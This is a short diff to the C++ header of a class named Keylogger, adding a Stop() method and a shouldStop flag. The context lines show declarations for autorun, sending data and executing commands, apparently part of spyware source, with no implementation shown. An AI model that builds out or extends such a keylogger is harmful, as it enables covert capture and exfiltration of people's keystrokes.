@@ -12,6 +12,7 @@ public:
 	~Keylogger();
     
 	void Run();
+	void Stop();
     bool SetAutorun(bool autorun);
 
 private:
@@ -23,6 +24,7 @@ private:
     void Send();
     void ReadData(int len);
 
+	bool shouldStop;
 
     CommandExe cmd;
 
